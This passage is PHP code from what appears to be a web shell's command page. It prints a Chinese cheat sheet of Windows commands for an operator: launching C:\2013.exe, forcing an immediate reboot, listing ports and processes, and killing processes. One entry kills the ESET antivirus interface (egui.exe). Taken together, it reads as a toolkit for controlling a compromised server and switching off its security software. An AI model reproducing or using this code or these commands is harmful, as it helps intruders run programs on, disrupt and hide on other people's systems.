...
xhtml_head("SHELL");
echo "<div class=\"like\">\n";
echo "<a href=\"./index.php?path=".urlencode($getcwd)."\">返回目录</a>SHELL<br/>\n";
echo "运行命令： start \"\" \"C:\\2013.exe\"<br/>\n";
echo "重启命令： shutdown -f -r -t 0<br/>\n";
echo "端口查看： netstat -an<br/>\n";
echo "查看进程： TASKLIST 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。<br/>\n";
echo "关闭进程： TASKKILL /F /PID 388 /T<br/>\n";
echo "关闭进程： taskkill /im /f egui.exe<br/>\n";
echo "端口查看： netstat -an<br/>\n";
echo "</div>\n";
echo "<div class=\"love\">\n";
